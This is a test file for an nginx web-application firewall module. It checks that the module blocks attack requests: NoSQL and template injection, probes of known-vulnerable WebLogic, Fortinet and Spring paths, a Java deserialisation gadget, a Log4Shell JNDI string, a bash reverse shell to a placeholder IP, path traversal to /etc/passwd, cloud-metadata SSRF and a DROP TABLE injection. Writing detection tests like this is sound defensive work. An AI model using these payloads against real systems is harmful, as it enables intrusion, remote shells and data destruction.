# True positives for the categories added in the second signature pass:
# nosql, ssti, exploit_path, plus a few of the newly expanded existing ones.
use Test::Nginx::Socket 'no_plan';

repeat_each(1);
no_long_string();
run_tests();

__DATA__

=== TEST 1: NoSQL operator injection in query
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?user%5B%24ne%5D=1&pass%5B%24ne%5D=1
--- error_code: 403

=== TEST 2: NoSQL $where in body
--- config
    location /t { shield block; empty_gif; }
--- request
POST /t
{"$where":"this.a=='b'"}
--- more_headers
Content-Type: application/json
--- error_code: 403

=== TEST 3: SSTI arithmetic probe
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?name=%7B%7B7*7%7D%7D
--- error_code: 403

=== TEST 4: SSTI object traversal
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?x=%7B%7B''.__class__%7D%7D
--- error_code: 403

=== TEST 5: exploit path — WebLogic wls-wsat
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t/wls-wsat/CoordinatorPortType
--- error_code: 403

=== TEST 6: exploit path — Fortinet fgt_lang traversal
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t/remote/fgt_lang?lang=/../../../..//////////dev/
--- error_code: 403

=== TEST 7: exploit path — Spring Actuator gateway RCE
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t/actuator/gateway/routes
--- error_code: 403

=== TEST 8: expanded deserial — Java gadget class in body
--- config
    location /t { shield block; empty_gif; }
--- request
POST /t
{"a":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x/e"}}
--- more_headers
Content-Type: application/json
--- error_code: 403

=== TEST 9: expanded template — Log4Shell rmi variant
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t
--- more_headers
User-Agent: ${jndi:rmi://evil/a}
--- error_code: 403

=== TEST 10: expanded cmdi — reverse shell via /dev/tcp
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?host=x;bash%20-i%20%3E&%20/dev/tcp/1.2.3.4/4444%200%3E&1
--- error_code: 403

=== TEST 11: expanded traversal — encoded ..%2f
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?f=..%2f..%2f..%2fetc%2fpasswd
--- error_code: 403

=== TEST 12: expanded ssrf — Alibaba metadata IP
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?url=http://100.100.100.200/latest/meta-data/
--- error_code: 403

=== TEST 13: expanded sqli — stacked drop table
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?id=1;%20DROP%20TABLE%20users
--- error_code: 403

=== TEST 14: new categories can be skipped
--- config
    location /t { shield block; shield_skip ssti nosql exploit_path; empty_gif; }
--- request
GET /t?name=%7B%7B7*7%7D%7D&u%5B%24ne%5D=1
--- error_code: 200
